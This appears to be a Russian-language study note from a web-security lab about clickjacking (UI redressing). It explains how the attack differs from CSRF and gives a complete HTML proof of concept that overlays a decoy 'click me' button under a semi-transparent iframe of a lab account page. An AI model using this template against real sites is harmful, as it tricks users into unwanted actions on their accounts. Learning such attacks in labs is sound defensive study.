# Clickjacking (UI redressing)

Форма прорисовывается поверх формы лигитимного приложения. Разница от CSRF в том, что требуется от пользователя интерактивных действий (кликнуть по кнопке, например).

CSRF токены не защищают от этого вида атак. Защищает детектирование того, что сайт загружен в скрытом iframe.

## Construct basic clickjacking attack

```markup
<html>
    <head>
        <title>UI Redressing PoC</title>
        <style>
            #target_website {
                position:relative;
                width:700px;
                height:500px;
                opacity:0.2;
                z-index:2;  /* Элемент с наиболее высоким z-index, перекрывает другие
                               Тем самым видимая часть (div) будет наверху, но фактически активным будет iframe
                            */
            }
            #decoy_website {
                position:absolute;
                z-index:1;
            }
            #btn_action {
                position: relative;
                width: 100px;
                height: 20px;
                color: brown; 
                top: 445px;  
                left: 40px;   
            }
        </style>
    </head>
    <body>
        <div id="decoy_website">
            <button id="btn_action">
                click me
            </button>
            ...decoy web content here...
        </div>
        <iframe id="target_website" src="https://0ac0003404fc3984c07807190024003a.web-security-academy.net/my-account?email=email2@gmail.com">
        </iframe>
    </body>
</html>
```
